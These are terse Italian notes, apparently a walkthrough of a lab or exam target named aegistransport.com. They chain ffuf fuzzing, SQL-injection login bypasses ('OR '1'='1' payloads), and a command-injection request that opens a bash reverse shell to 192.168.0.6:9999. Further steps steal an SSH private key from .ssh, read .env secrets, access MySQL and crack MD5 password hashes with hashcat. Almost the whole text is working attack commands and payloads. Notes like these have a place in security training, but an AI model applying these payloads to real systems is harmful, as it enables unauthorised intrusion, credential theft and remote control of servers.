prova injection su login, mappa etc.

ffuf:
```
	ffuf -w ./wordlist.txt -u https://FUZZ.aegistransport.com
	
	ffuf -w ./wordlistacaso.txt -u https://aegistransport.com/FUZZ
```

Poi quando trovi dev fai fuzz anche anche con cartelle/file
```
	ffuf -w ./wordlist.txt -u https://dev.aegistransport.com/FUZZ -e .php,.html,.txt,.py,.css
```

guarda /backup
trova utenti

in /to-do
prendi lo swagger e mettilo su un editor online

poi

su dev.aegistranport.com/login.html
sql injection
```
	') OR '1'='1'; -- 
```

![[Pasted image 20260607182509.png]]

postman:
https://dev.aegistransport.com/api/users/x
vai a tentativi e trova l'admin

![[Pasted image 20260607193159.png]]

ora che so che l'admin è g.ricci

fai login da admin con:
- g.ricci
- ') OR '1'='1' AND username='g.ricci'; --

su burpsuite:
"username":"g.ricci","password":"') OR '1'='1' AND username='m.ferretti'; -- "

POSTMAN
POST https://dev.aegistransport.com/api/v1/vip/search/run
```
{
    "q": "; bash -c 'bash -i >& /dev/tcp/192.168.0.6/9999 0>&1';"
}
````

senza bash -c ' ti da bad fd, devi far interpretare il payload a bash

in /mnt/aegis/.ssh -> 
- id_rsa -> salva chiave privata in un file
- authorized_keys -> username

fai login ssh con
```
	ssh -i nomeFile nomeUtente@ipMacchina
```

vai su Web-App-Esame-main
cat .env

```
	docker inspect --format '{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $(docker ps -q)
```

docker ps per trovare la porta (default probabile)

mysql -u username -p -h ipAegisDb -P 3306 -D nomeDB

zamu:
SELECT * FROM it_maintenance

hash di un altro utente
- crea file con hash utente
- hashcat -m 0 nomefile wordlist
- se non va hashcat for some fucking reason usa crackstation




